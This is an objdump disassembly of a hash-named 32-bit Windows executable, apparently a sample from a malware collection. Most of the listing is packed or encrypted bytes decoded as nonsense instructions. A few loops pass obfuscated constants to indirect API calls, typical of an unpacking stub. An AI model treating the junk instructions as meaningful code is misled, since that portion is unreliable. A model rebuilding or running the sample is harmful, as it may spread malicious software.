
725241f81eaaf19984ef4f52c2e1ba9b8ff6f0cfbb7fb9923b7284630f2bd1aa.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc98
  40100b:	jmp    0x4011ce
  401010:	inc    DWORD PTR ss:[esi]
  401013:	shl    BYTE PTR [edi-0x1ca60faf],1
  401019:	fs cmp eax,0xfc6a378c
  40101f:	lahf   
  401020:	jle    0x4010a0
  401022:	jle    0x4010a2
  401024:	cwde   
  401025:	jg     0x4010a5
  401027:	jle    0x400ff7
  401029:	xlat   BYTE PTR ds:[ebx]
  40102a:	cmp    eax,0xcfd339d5
  40102f:	ror    esi,1
  401031:	pop    es
  401032:	add    al,0x3
  401034:	cmovg  eax,DWORD PTR [eax]
  401037:	rdpmc  
  401039:	xadd   BYTE PTR [eax],bl
  40103c:	(bad)  
  40103d:	adc    BYTE PTR [edi],bl
  40103f:	mov    ecx,0xddb70058
  401044:	push   cs
  401045:	out    dx,eax
  401046:	mov    ebp,0x8e03d6db
  40104b:	es mov esi,0x1541a2f4
  401051:	lods   eax,DWORD PTR ds:[esi]
  401052:	fiadd  WORD PTR [esi+0x1f]
  401055:	data16 in al,dx
  401057:	outs   dx,DWORD PTR ds:[esi]
  401058:	or     edx,DWORD PTR [ecx]
  40105a:	pushf  
  40105b:	js     0x401033
  40105d:	inc    eax
  40105e:	stos   BYTE PTR es:[edi],al
  40105f:	push   ebx
  401060:	sub    eax,0xad3cc4d1
  401065:	mov    bh,BYTE PTR [ebx-0x3b]
  401068:	stos   DWORD PTR es:[edi],eax
  401069:	push   es
  40106a:	(bad)  
  40106b:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  401071:	jmp    0x4010a3
  401073:	mov    ebp,ecx
  401075:	dec    edi
  401076:	out    0xa6,al
  401078:	inc    ecx
  401079:	call   DWORD PTR [edi-0x2556f868]
  40107f:	mov    ebp,0x5536ed4d
  401084:	and    esi,DWORD PTR [edx-0x43619116]
  40108a:	jnp    0x40109d
  40108c:	ret    
  40108d:	xchg   edx,eax
  40108e:	and    esp,edx
  401090:	jmp    0x4010f0
  401092:	ret    0xb8e4
  401095:	lock jmp 0xd765:0x74cf3192
  40109d:	and    ch,cl
  40109f:	add    bl,cl
  4010a1:	adc    DWORD PTR [ecx-0x5a],edx
  4010a4:	xor    eax,0x78616f03
  4010a9:	or     BYTE PTR [ecx],dh
  4010ab:	fisttp QWORD PTR [esi+0x7f752854]
  4010b1:	(bad)
  4010b6:	or     ebx,DWORD PTR [ebx+0x55]
  4010b9:	fst    st(6)
  4010bb:	or     ebx,edx
  4010bd:	pop    esp
  4010be:	fstp   DWORD PTR [ecx]
  4010c0:	jno    0x401060
  4010c2:	inc    esi
  4010c3:	dec    ebx
  4010c4:	aaa    
  4010c5:	adc    eax,0x1a29772b
  4010ca:	sar    DWORD PTR [esi],cl
  4010cc:	dec    edi
  4010cd:	call   0x8573b59f
  4010d2:	das    
  4010d3:	lds    ecx,FWORD PTR [edx+0x1d]
  4010d6:	mov    edx,0x5b57eb50
  4010db:	pop    ecx
  4010dc:	cmp    BYTE PTR [eax],cl
  4010de:	pop    esp
  4010df:	mov    bh,0x4f
  4010e1:	dec    edi
  4010e2:	or     ecx,DWORD PTR [edx+0x400e0493]
  4010e8:	xchg   ecx,eax
  4010e9:	out    0xfb,eax
  4010eb:	xchg   edx,esi
  4010ed:	jmp    0x401124
  4010ef:	sbb    ecx,DWORD PTR [ebx-0x703baa0c]
  4010f5:	loop   0x4010b4
  4010f7:	mov    ch,0x65
  4010f9:	les    edi,FWORD PTR [edi-0x6ab10e5]
  4010ff:	dec    eax
  401100:	(bad)  
  401101:	fst    QWORD PTR [esi+0x39]
  401104:	cmp    edi,DWORD PTR [ebx+0x4]
  401107:	sti    
  401108:	jae    0x40109f
  40110a:	push   esi
  40110c:	arpl   si,ax
  40110e:	sbb    DWORD PTR [edx+0x25d4a256],esp
  401114:	add    BYTE PTR [esi],0x1e
  401117:	sub    eax,ebx
  401119:	mov    edi,0x70a338a6
  40111e:	xchg   edi,eax
  40111f:	rcl    DWORD PTR [eax+0x4e4e61df],1
  401125:	adc    al,0xb0
  401127:	dec    ebp
  401128:	push   ecx
  401129:	push   edx
  40112a:	and    BYTE PTR [ebp+esi*1-0x8],bh
  40112e:	mov    eax,ds:0x9de8f556
  401133:	and    DWORD PTR [edi+ebp*2],ecx
  401136:	push   edi
  401137:	popa   
  401138:	out    0x2d,eax
  40113a:	or     DWORD PTR [ebp-0x30],0xffffff9c
  40113e:	jno    0x4011a5
  401140:	cmp    cl,ah
  401142:	and    al,0xd5
  401144:	xor    DWORD PTR [ecx+0x39],ecx
  401147:	add    eax,DWORD PTR [esi]
  401149:	inc    ecx
  40114a:	out    0x90,eax
  40114c:	nop
  40114d:	mov    eax,0xa10192b
  401152:	jno    0x40110a
  401154:	sub    al,0xa2
  401156:	pop    es
  401157:	xchg   esi,eax
  401158:	out    dx,al
  401159:	push   ebx
  40115a:	dec    eax
  40115b:	int    0x35
  40115d:	mov    ecx,0xb1cfad50
  401162:	enter  0x6c43,0xcc
  401166:	aaa    
  401167:	in     al,dx
  401168:	js     0x4011ae
  40116a:	cmp    BYTE PTR [ebp+0x7657f6c1],dh
  401170:	pop    ss
  401171:	jle    0x401152
  401173:	push   ds
  401174:	int    0xc2
  401176:	add    BYTE PTR [edi+0x75],ah
  401179:	jmp    0x401152
  40117b:	in     al,0xc8
  40117d:	inc    esp
  40117e:	jne    0x401183
  401180:	frstor [edi]
  401182:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  401184:	imul   esi,DWORD PTR [ecx],0xcbfaa609
  40118a:	push   eax
  40118b:	xor    eax,0x314deb78
  401190:	sub    ecx,DWORD PTR [ecx+eax*8-0x4b8410e0]
  401197:	adc    DWORD PTR [esi+0x6fed2202],ecx
  40119d:	in     eax,dx
  40119e:	mov    dh,bh
  4011a0:	out    0xe6,al
  4011a2:	jl     0x4011cc
  4011a4:	inc    edx
  4011a5:	pusha  
  4011a6:	test   al,0x99
  4011a8:	leave  
  4011a9:	loope  0x4011ff
  4011ab:	sbb    eax,0x6c6ba368
  4011b0:	inc    esi
  4011b1:	das    
  4011b2:	nop
  4011b3:	dec    edx
  4011b4:	mov    edx,0xe0434b39
  4011b9:	pop    es
  4011ba:	jmp    0x671d:0xd2337f4d
  4011c1:	rcl    BYTE PTR [esi-0x4f],1
  4011c4:	das    
  4011c5:	cmp    DWORD PTR [ebp-0x6c0c635d],ebp
  4011cb:	sar    DWORD PTR [esi-0x1fba7696],0xb9
  4011d2:	cmp    bl,BYTE PTR [ebp+0x0]
  4011d5:	add    BYTE PTR [ebx+0x45c7e04d],cl
  4011db:	fadd   st(1),st
  4011dd:	dec    esi
  4011de:	add    BYTE PTR [eax],al
  4011e0:	cmp    ecx,eax
  4011e2:	jne    0x4020c2
  4011e8:	sbb    ecx,0xfa8
  4011ee:	mov    ax,WORD PTR [ebp-0x24]
  4011f2:	and    DWORD PTR ds:0x430455,0x0
  4011fc:	mov    ecx,DWORD PTR ds:0x430455
  401202:	inc    ecx
  401203:	mov    DWORD PTR ds:0x430455,ecx
  401209:	cmp    DWORD PTR ds:0x430455,0xb
  401210:	jne    0x401248
  401216:	push   0x25a9
  40121b:	push   0x3372
  401220:	push   0x5bb7
  401225:	push   DWORD PTR [ebp-0x1c]
  401228:	push   0x6ec1
  40122d:	push   DWORD PTR [ebp-0x28]
  401230:	push   0x3d62
  401235:	push   0x5689
  40123a:	push   DWORD PTR [ebp-0x28]
  40123d:	push   0x7975
  401242:	call   DWORD PTR ds:0x42ec0b
  401248:	cmp    DWORD PTR ds:0x430455,0xa
  40124f:	jne    0x401262
  401255:	mov    ecx,DWORD PTR ds:0x430455
  40125b:	inc    ecx
  40125c:	mov    DWORD PTR ds:0x430455,ecx
  401262:	cmp    DWORD PTR ds:0x430455,0x12
  401269:	jb     0x4011fc
  40126f:	mov    DWORD PTR ds:0x43044d,0x1e
  401279:	cmp    DWORD PTR ds:0x43044d,0x0
  401280:	je     0x401471
  401286:	cmp    DWORD PTR ds:0x43044d,0x2d
  40128d:	jne    0x40129c
  401293:	push   DWORD PTR [ebp-0x20]
  401296:	call   DWORD PTR ds:0x42e9a7
  40129c:	mov    ecx,DWORD PTR ds:0x43044d
  4012a2:	dec    ecx
  4012a3:	mov    DWORD PTR ds:0x43044d,ecx
  4012a9:	jmp    0x401279
  4012ae:	jmp    0x401471
  4012b3:	out    0xe8,al
  4012b5:	sub    al,BYTE PTR [ebx]
  4012b7:	xor    cl,al
  4012b9:	imul   ecx
  4012bb:	and    BYTE PTR [ecx],bh
  4012bd:	adc    esi,DWORD PTR [ebx-0x4d0ebac7]
  4012c3:	cwde   
  4012c4:	jg     0x401344
  4012c6:	jle    0x401260
  4012c8:	jg     0x401348
  4012ca:	jle    0x401316
  4012cc:	push   es
  4012cd:	cwde   
  4012ce:	adc    al,0x82
  4012d0:	lds    ecx,FWORD PTR [edx]
  4012d2:	out    dx,eax
  4012d3:	aam    0x6b
  4012d5:	int3   
  4012d6:	pop    ebp
  4012d7:	xor    esi,edi
  4012d9:	cmp    ch,BYTE PTR [esi-0x1e0a887c]
  4012df:	xchg   edx,eax
  4012e0:	mov    ebp,0x1df1bcc
  4012e5:	adc    eax,0x6a1799b7
  4012ea:	clc    
  4012eb:	pop    es
  4012ec:	retf   
  4012ed:	fst    DWORD PTR [ecx-0x2e]
  4012f0:	loop   0x401298
  4012f2:	adc    al,0xb2
  4012f4:	test   al,0x21
  4012f6:	pop    edx
  4012f7:	mov    ds:0xc19c4e3b,eax
  4012fc:	mov    ds,WORD PTR [edi+0x3]
  4012ff:	xchg   BYTE PTR [ebx],dl
  401301:	fwait
  401302:	scas   eax,DWORD PTR es:[edi]
  401303:	mov    esp,0x5059f009
  401308:	and    bh,BYTE PTR [ecx-0x88d4c86]
  40130e:	xchg   ah,bl
  401310:	add    DWORD PTR [ebx+0x3f],eax
  401313:	add    esi,DWORD PTR [eax+0x4f]
  401316:	xchg   edi,eax
  401317:	call   0x2dd035fd
  40131c:	pop    ds
  40131d:	outs   dx,DWORD PTR ds:[esi]
  40131e:	loop   0x4012b0
  401320:	leave  
  401321:	outs   dx,DWORD PTR ds:[esi]
  401322:	mov    edx,0x3d9e2cec
  401327:	scas   eax,DWORD PTR es:[edi]
  401328:	fdivrp st(7),st
  40132a:	repz jecxz 0x401333
  40132d:	fcomp  st(7)
  40132f:	shl    BYTE PTR [ecx+0x7c],0xd2
  401333:	imul   esi,DWORD PTR [ebx+0x8],0x36
  401337:	fcmovu st,st(7)
  401339:	nop
  40133a:	xchg   edx,eax
  40133b:	push   es
  40133c:	gs push eax
  40133e:	push   esp
  40133f:	mov    ebp,0xf757908d
  401344:	loopne 0x401373
  401346:	push   ds
  401347:	or     eax,0xe1d74d51
  40134c:	and    ecx,DWORD PTR [edx]
  40134e:	stos   DWORD PTR es:[edi],eax
  40134f:	lods   al,BYTE PTR ds:[esi]
  401350:	jmp    0x401310
  401352:	inc    esi
  401353:	mov    al,ds:0x8b26f81
  401358:	(bad)  
  401359:	ds retf 0xc284
  40135d:	lods   al,BYTE PTR ds:[esi]
  40135e:	xchg   BYTE PTR [eax-0x1a7b2fff],al
  401364:	push   0x9988c9c7
  401369:	and    DWORD PTR [edx-0x183f0ad9],edx
  40136f:	mov    bh,0xba
  401371:	mov    ds:0x5d748d6d,al
  401376:	rol    DWORD PTR [eax-0x16acbd75],0x12
  40137d:	fst    DWORD PTR [ecx]
  40137f:	scas   eax,DWORD PTR es:[edi]
  401380:	xor    DWORD PTR [ebp-0x17],ecx
  401383:	stos   DWORD PTR es:[edi],eax
  401384:	and    eax,0x7a771c2c
  401389:	push   esp
  40138a:	scas   al,BYTE PTR es:[edi]
  40138b:	in     al,0xff
  40138d:	push   ecx
  40138e:	les    ecx,FWORD PTR [ecx+0x15636696]
  401394:	retf   
  401395:	jge    0x401416
  401397:	and    cl,ch
  401399:	shl    BYTE PTR ds:0x3fee8196,1
  40139f:	xchg   ebx,eax
  4013a0:	stc    
  4013a1:	or     eax,0x48ea964e
  4013a6:	mov    ecx,0xb05aaa6b
  4013ab:	push   es
  4013ac:	jle    0x4013f6
  4013ae:	lahf   
  4013af:	std    
  4013b0:	sub    eax,0xf70d3ae
  4013b5:	push   esi
  4013b6:	sar    BYTE PTR [ebp+0x30],0x44
  4013ba:	dec    esi
  4013bb:	fwait
  4013bc:	mov    esp,0xaf1d0efd
  4013c1:	imul   esp,DWORD PTR [ecx-0x1c],0x49784308
  4013c8:	cmp    BYTE PTR [ebx-0x23],dl
  4013cb:	push   0x766e60e7
  4013d0:	das    
  4013d1:	js     0x401409
  4013d3:	and    al,0x16
  4013d5:	pop    eax
  4013d6:	lea    edx,[esi+0x767172a2]
  4013dc:	jb     0x4013b0
  4013de:	dec    edx
  4013df:	or     bl,al
  4013e1:	sbb    ebx,DWORD PTR [esi]
  4013e3:	pop    esp
  4013e4:	inc    ebx
  4013e5:	sub    eax,edx
  4013e7:	pop    ds
  4013e8:	pop    esp
  4013e9:	mov    fs,WORD PTR [esi+0x3b23ede3]
  4013ef:	sub    al,0xba
  4013f1:	ins    DWORD PTR es:[edi],dx
  4013f2:	or     bh,BYTE PTR [ebx]
  4013f4:	sub    BYTE PTR [ebx],cl
  4013f6:	pop    edx
  4013f7:	xchg   esp,eax
  4013f8:	ret    
  4013f9:	fprem1 
  4013fb:	mov    BYTE PTR [ecx],ah
  4013fd:	sbb    al,0x1c
  4013ff:	and    BYTE PTR [eax+0x5aeae3dc],ch
  401405:	xchg   esp,eax
  401406:	xor    BYTE PTR [ebx+edi*2],al
  401409:	je     0x401424
  40140b:	jge    0x401474
  40140d:	test   al,0xea
  40140f:	dec    edx
  401410:	sahf   
  401411:	punpckhbw mm4,QWORD PTR [esi-0x553d7bcd]
  401418:	mov    ecx,ebp
  40141a:	je     0x4013c6
  40141c:	in     eax,0x3c
  40141e:	xchg   ebp,eax
  40141f:	dec    esp
  401420:	loop   0x401454
  401422:	dec    edi
  401423:	mov    eax,ds:0x40027703
  401428:	(bad)  [edi-0x361195]
  40142e:	loop   0x40147a
  401430:	inc    ebx
  401431:	sbb    esi,DWORD PTR [ecx-0x3b]
  401434:	push   edx
  401435:	mov    bl,0x2
  401437:	and    bl,BYTE PTR [ebx]
  401439:	dec    esp
  40143a:	jnp    0x4013fd
  40143c:	and    al,0x30
  40143e:	pop    ebx
  40143f:	in     eax,0x81
  401441:	fst    st(1)
  401443:	add    cl,BYTE PTR [ebp+0x4b94c220]
  401449:	push   0x395a2a1c
  40144e:	inc    esp
  40144f:	ins    BYTE PTR es:[edi],dx
  401450:	lds    esi,FWORD PTR [eax-0x2b8af589]
  401456:	xlat   BYTE PTR ds:[ebx]
  401457:	adc    dh,BYTE PTR [esi]
  401459:	das    
  40145a:	fidiv  DWORD PTR [edx-0x78]
  40145d:	jmp    0x401490
  40145f:	cmp    al,0xab
  401461:	dec    esp
  401462:	pop    ebp
  401463:	and    BYTE PTR [ebp-0x1f],bh
  401466:	sar    BYTE PTR [ecx],1
  401468:	cli    
  401469:	xchg   ebp,eax
  40146a:	mov    ah,0xcc
  40146c:	add    BYTE PTR [esp+ebp*2-0x7c],dh
  401470:	jb     0x4014c8
  401472:	mov    ecx,0x8a3c
  401477:	adc    DWORD PTR ds:0x42eddb,0x2f3d
  401481:	xor    ax,cx
  401484:	movzx  esi,WORD PTR ds:0x430439
  40148b:	or     DWORD PTR ds:0x4304eb,esi
  401491:	mov    ecx,DWORD PTR [ebp+0x8]
  401494:	jmp    0x401657
  401499:	adc    eax,0x716ff192
  40149e:	ins    DWORD PTR es:[edi],dx
  40149f:	xchg   ecx,eax
  4014a0:	jo     0x40144d
  4014a2:	or     eax,0x7d860fff
  4014a7:	cdq    
  4014a8:	adc    al,dl
  4014aa:	jge    0x40152a
  4014ac:	jle    0x401446
  4014ae:	jg     0x40152e
  4014b0:	jle    0x40151c
  4014b2:	pop    ebx
  4014b3:	push   ss
  4014b4:	inc    esi
  4014b5:	jge    0x401467
  4014b7:	call   0x75f4:0xff2d2180
  4014be:	mov    eax,0xfe761cc6
  4014c3:	cmp    BYTE PTR ds:0x5f6782ae,dh
  4014c9:	js     0x40147d
  4014cb:	sub    al,0x39
  4014cd:	sbb    edi,DWORD PTR [esi+esi*4-0x5c]
  4014d1:	out    dx,al
  4014d2:	push   esi
  4014d3:	iret   
  4014d4:	adc    eax,0xf18a7441
  4014d9:	pop    esi
  4014da:	aam    0x92
  4014dc:	aaa    
  4014dd:	dec    ecx
  4014de:	sub    ebp,DWORD PTR [esi]
  4014e0:	adc    al,BYTE PTR [eax-0x26]
  4014e3:	xchg   ebp,eax
  4014e4:	or     al,0xf2
  4014e6:	cwde   
  4014e7:	nop
  4014e8:	call   0x5e72:0xf8f59b74
  4014ef:	xor    dl,al
  4014f1:	xchg   edx,eax
  4014f2:	jmp    0x33b0:0x2b343ba
  4014f9:	fwait
  4014fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4014fb:	mov    BYTE PTR [edi-0x40309bac],bh
  401501:	xor    BYTE PTR [eax],al
  401503:	std    
  401504:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401505:	stos   WORD PTR es:[edi],ax
  401507:	mov    cl,0x7f
  401509:	mov    ds,ebx
  40150b:	pusha  
  40150c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40150d:	jbe    0x4014f5
  40150f:	das    
  401510:	sbb    edi,DWORD PTR [ebp+0x6bbca387]
  401516:	add    BYTE PTR [ebx-0x13],0xa2
  40151a:	mov    dl,0x48
  40151c:	mov    BYTE PTR [ecx-0x8],cl
  40151f:	bnd jnp 0x4014c8
  401522:	xchg   esi,eax
  401523:	push   0xffffffc0
  401525:	dec    esi
  401526:	inc    ebx
  401527:	and    BYTE PTR [ecx+0xe],dl
  40152a:	or     esp,DWORD PTR [ebp+0x502f064b]
  401530:	jbe    0x401501
  401532:	and    eax,esi
  401534:	ds jle 0x40155e
  401537:	loopne 0x40150a
  401539:	sbb    esp,esi
  40153b:	ja     0x4015ae
  40153d:	sbb    eax,DWORD PTR [eax-0x5e]
  401540:	cwde   
  401541:	dec    esi
  401542:	mov    al,ds:0xbc0387b4
  401547:	cmp    al,BYTE PTR [edi]
  401549:	sbb    eax,0xdbc47d8e
  40154e:	ins    DWORD PTR es:[edi],dx
  40154f:	fst    QWORD PTR [ecx+0x1fd936ba]
  401555:	xchg   ebx,eax
  401556:	sub    esp,edi
  401558:	mov    edx,0x9cb7c599
  40155d:	or     bl,dh
  40155f:	mov    ch,0x3f
  401561:	push   0x16
  401563:	cmp    al,0x3e
  401565:	imul   edx,DWORD PTR [edx+0x24be4b95],0x4325f6a5
  40156f:	shr    DWORD PTR [edx+edi*4-0x53],cl
  401573:	out    0xf9,al
  401575:	ret    
  401576:	dec    eax
  401577:	ins    DWORD PTR es:[edi],dx
  401578:	stos   DWORD PTR es:[edi],eax
  401579:	sub    DWORD PTR [esi-0x1a],ebp
  40157c:	xor    eax,0xe7d9d2fc
  401581:	mov    edi,0x216a1123
  401586:	xchg   edi,eax
  401587:	fcom   QWORD PTR [edx-0x4e]
  40158a:	mov    ds:0xa244c4a8,eax
  40158f:	cmp    eax,0x4ac41e4a
  401594:	pop    ecx
  401595:	ins    BYTE PTR es:[edi],dx
  401596:	ins    BYTE PTR es:[edi],dx
  401597:	pop    esi
  401598:	scas   al,BYTE PTR es:[edi]
  401599:	inc    eax
  40159a:	inc    ebx
  40159b:	out    0xbf,eax
  40159d:	test   esi,ebx
  40159f:	sahf   
  4015a0:	mov    edx,DWORD PTR [eax-0x23]
  4015a3:	jnp    0x40156a
  4015a5:	stos   BYTE PTR es:[edi],al
  4015a6:	push   ecx
  4015a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4015a8:	popa   
  4015a9:	fimul  WORD PTR [edi]
  4015ab:	xchg   esi,eax
  4015ac:	scas   al,BYTE PTR es:[edi]
  4015ad:	mov    ebp,0x20142eda
  4015b2:	xchg   edx,eax
  4015b3:	mov    ecx,0xbc5e41e1
  4015b8:	cmc    
  4015b9:	gs rol edx,1
  4015bc:	inc    eax
  4015bd:	pushf  
  4015be:	or     dl,BYTE PTR [esi-0x3c]
  4015c1:	mov    dh,0x13
  4015c3:	sub    al,0xc2
  4015c5:	mov    al,0x4f
  4015c7:	scas   al,BYTE PTR es:[edi]
  4015c8:	sar    DWORD PTR [edx-0x2c],1
  4015cb:	sti    
  4015cc:	scas   al,BYTE PTR es:[edi]
  4015cd:	jne    0x40156a
  4015cf:	ret    0xd9f4
  4015d2:	lods   eax,DWORD PTR cs:[esi]
  4015d4:	xor    BYTE PTR [eax-0x6d],0x38
  4015d8:	fs out dx,al
  4015da:	inc    ebp
  4015db:	cmp    BYTE PTR [edi-0x51],ch
  4015de:	(bad)  
  4015df:	cmp    BYTE PTR [esi+0xe],cl
  4015e2:	jne    0x4015d8
  4015e4:	lock les edx,FWORD PTR [eax+0x2b]
  4015e8:	sbb    cl,BYTE PTR ds:0x4d1f2142
  4015ee:	mov    eax,ds:0xd5ac757f
  4015f3:	icebp  
  4015f4:	fldcw  WORD PTR [ebp-0x65c3bc08]
  4015fa:	out    dx,al
  4015fb:	popf   
  4015fc:	sub    al,0x13
  4015fe:	pop    edi
  4015ff:	xchg   edi,eax
  401600:	jge    0x401625
  401602:	cmp    ch,ch
  401604:	pusha  
  401605:	cld    
  401606:	test   dh,bh
  401608:	loopne 0x4015ba
  40160a:	xor    BYTE PTR [eax],bh
  40160c:	dec    ebp
  40160d:	cs pushf 
  40160f:	mov    BYTE PTR ds:0xe42b67ca,ah
  401615:	ret    0x2710
  401618:	mov    al,0xad
  40161a:	jp     0x401602
  40161c:	enter  0x890b,0xdd
  401620:	xor    cl,BYTE PTR [esi-0x2d628ee2]
  401626:	popf   
  401627:	ret    
  401628:	and    bh,al
  40162a:	xor    DWORD PTR [edx+eax*1+0x47],ebp
  40162e:	add    BYTE PTR [edi-0x21],bh
  401631:	inc    ebx
  401632:	fcom   DWORD PTR [eax+edx*2]
  401635:	repz aaa 
  401637:	mov    bl,0xc3
  401639:	repz cmp al,0x64
  40163c:	jecxz  0x4015e6
  40163e:	or     al,al
  401640:	vpsubsw ymm4,ymm7,ymm3
  401644:	gs sub al,0x17
  401647:	pop    ebp
  401648:	mov    ah,0xc3
  40164a:	add    ecx,DWORD PTR [eax-0xedf8a9a]
  401650:	xchg   BYTE PTR ds:[eax+0x68],cl
  401654:	(bad)  
  401655:	push   edi
  401656:	sub    DWORD PTR [edi+0x23],edx
  401659:	imul   ecx
  40165b:	mov    esi,0xe000001
  401660:	and    BYTE PTR [edi],dh
  401662:	pop    ebp
  401663:	xor    DWORD PTR [ecx+0x54],ebp
  401666:	jno    0x4016b3
  401668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401669:	cmp    BYTE PTR [edi],bl
  40166b:	mov    ds:0x6cf78710,al
  401670:	jp     0x4016f0
  401672:	jle    0x40160c
  401674:	jg     0x4016f4
  401676:	jle    0x4016b0
  401678:	mov    BYTE PTR [edx+edi*4],dh
  40167b:	imul   edx,edx,0x46
  40167e:	mov    ecx,esp
  401680:	jne    0x401684
  401682:	mov    ebx,0xddf57ffe
  401687:	or     dl,BYTE PTR [ebp-0x30]
  40168a:	nop
  40168b:	pop    eax
  40168c:	cld    
  40168d:	dec    ecx
  40168e:	xchg   ebx,eax
  40168f:	dec    esp
  401690:	shl    BYTE PTR [ecx],0xc3
  401693:	(bad)  
  401694:	mov    BYTE PTR [ecx-0x12],dl
  401697:	xor    eax,0xc2540c8b
  40169c:	dec    edx
  40169d:	mov    eax,0x47b88581
  4016a2:	add    esp,esi
  4016a4:	dec    eax
  4016a5:	int    0x2a
  4016a7:	test   al,0xf1
  4016a9:	dec    edx
  4016aa:	ins    DWORD PTR es:[edi],dx
  4016ab:	push   ebp
  4016ac:	iret   
  4016ad:	add    BYTE PTR [esi-0x6d8551d1],bl
  4016b3:	ret    0xe80e
  4016b6:	scas   al,BYTE PTR es:[edi]
  4016b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016b8:	sete   BYTE PTR [eax+ebx*4-0x10f746a3]
  4016c0:	xchg   ebx,eax
  4016c1:	nop
  4016c2:	push   eax
  4016c3:	sub    edx,DWORD PTR ds:0xec14f0a4
  4016c9:	push   edi
  4016ca:	addr16 jb 0x401713
  4016cd:	leave  
  4016ce:	outs   dx,BYTE PTR ds:[esi]
  4016cf:	nop
  4016d0:	scas   eax,DWORD PTR es:[edi]
  4016d1:	xchg   ebp,eax
  4016d2:	xchg   esi,eax
  4016d3:	pop    ebx
  4016d4:	inc    edi
  4016d5:	fadd   st,st(4)
  4016d7:	ds push eax
  4016d9:	test   DWORD PTR [ebx],ebx
  4016db:	pop    ebp
  4016dc:	adc    DWORD PTR [ebx],ecx
  4016de:	cld    
  4016df:	dec    eax
  4016e0:	fcom   QWORD PTR [eax+0x2f]
  4016e3:	pop    ds
  4016e4:	not    al
  4016e6:	in     al,dx
  4016e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016e8:	out    0xba,eax
  4016ea:	test   eax,0x178ef3c8
  4016ef:	lea    eax,[ebx-0x7d]
  4016f2:	pop    ss
  4016f3:	sub    esi,DWORD PTR [ebp+0x40]
  4016f6:	sbb    eax,0x2d2803f0
  4016fb:	push   edx
  4016fc:	dec    esp
  4016fd:	jmp    0x10ffd36d
  401702:	bound  edi,QWORD PTR [esp+eax*1-0x5b298b35]
  401709:	cmp    BYTE PTR [eax-0x7b],bl
  40170c:	jae    0x401711
  40170e:	mov    edi,0x40d75f3
  401713:	lods   al,BYTE PTR ds:[esi]
  401714:	sahf   
  401715:	lods   al,BYTE PTR ds:[esi]
  401716:	xchg   edx,eax
  401717:	mov    dl,0x8a
  401719:	add    eax,0x189c0018
  40171e:	xor    dl,cl
  401720:	cmp    BYTE PTR [edx-0x373655ea],0x4b
  401727:	adc    eax,0x58ca1a43
  40172c:	mov    ecx,0x456e4ee3
  401731:	mov    edi,?
  401733:	sbb    DWORD PTR [ecx-0x30],edi
  401736:	(bad)  
  401737:	mov    ?,eax
  401739:	adc    ebp,DWORD PTR [ecx+0x116cdcd9]
  40173f:	or     ch,ah
  401741:	inc    ebp
  401742:	rol    DWORD PTR [edi-0x15],1
  401745:	and    ebp,DWORD PTR [eax]
  401747:	push   es
  401748:	push   esp
  401749:	and    al,BYTE PTR [esi]
  40174b:	inc    edx
  40174c:	cmp    al,0x83
  40174e:	arpl   WORD PTR [ecx+0x6b552573],bp
  401754:	push   ds
  401755:	outs   dx,DWORD PTR ds:[esi]
  401756:	dec    edi
  401757:	add    edx,DWORD PTR [ecx-0x77ab9273]
  40175d:	jo     0x4017ac
  40175f:	aad    0x99
  401761:	inc    DWORD PTR [edi]
  401763:	pop    ss
  401764:	jbe    0x40174e
  401766:	push   edi
  401767:	shl    dl,0x5
  40176a:	retf   
  40176b:	inc    edi
  40176c:	fdiv   QWORD PTR [edi+0x76]
  40176f:	dec    edi
  401770:	sti    
  401771:	and    al,0x6f
  401773:	outs   dx,BYTE PTR ds:[esi]
  401774:	out    0x56,al
  401776:	jno    0x401765
  401778:	xor    eax,0x781ce486
  40177d:	test   DWORD PTR [ecx],edi
  40177f:	jle    0x4017ab
  401781:	push   ecx
  401782:	ret    0x3675
  401785:	sbb    BYTE PTR [ecx-0x5fa6dd28],cl
  40178b:	add    ebp,esi
  40178d:	push   ds
  40178e:	sahf   
  40178f:	inc    esp
  401790:	xchg   esi,eax
  401791:	dec    ecx
  401792:	jl     0x401751
  401794:	ja     0x4017d0
  401796:	arpl   WORD PTR [edi+ecx*1-0x55],sp
  40179a:	loope  0x4017cf
  40179c:	jl     0x40178a
  40179e:	mov    edx,0x4fcb2d02
  4017a3:	(bad)  [ebp-0x6ca32501]
  4017a9:	imul   esp,esp,0x6cbc8d92
  4017af:	xor    al,0x5a
  4017b1:	cs jl  0x401798
  4017b4:	ret    
  4017b5:	jge    0x401738
  4017b7:	inc    eax
  4017b8:	je     0x4017d6
  4017ba:	jns    0x4017f1
  4017bc:	rcl    BYTE PTR [ebp-0x5d],1
  4017bf:	jmp    0xf6b0:0xc00f97dd
  4017c6:	or     DWORD PTR [ecx+0x2d23478d],eax
  4017cc:	jbe    0x401819
  4017ce:	xchg   esp,eax
  4017cf:	shl    BYTE PTR [eax-0x4a3dc2e6],1
  4017d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017d6:	and    dh,BYTE PTR [esp+edi*2-0x6f63c18c]
  4017dd:	std    
  4017de:	frstor [edi-0x69442e89]
  4017e4:	lock cmp ch,dh
  4017e7:	hlt    
  4017e8:	push   ecx
  4017e9:	pop    esi
  4017ea:	popa   
  4017eb:	outs   dx,DWORD PTR ds:[esi]
  4017ec:	call   FWORD PTR [ecx+edx*8-0xdf3a0c0]
  4017f3:	xchg   ebx,eax
  4017f4:	popf   
  4017f5:	sub    al,0xf0
  4017f7:	loop   0x401844
  4017f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017fa:	scas   al,BYTE PTR es:[edi]
  4017fb:	outs   dx,BYTE PTR ds:[esi]
  4017fc:	int3   
  4017fd:	test   BYTE PTR [edi],bl
  4017ff:	xchg   ecx,eax
  401800:	xchg   ecx,eax
  401801:	loopne 0x401812
  401803:	loope  0x401790
  401805:	nop
  401806:	call   0x9d94:0xc7838a05
  40180d:	sbb    cl,BYTE PTR fs:[ebx-0x3fe8d973]
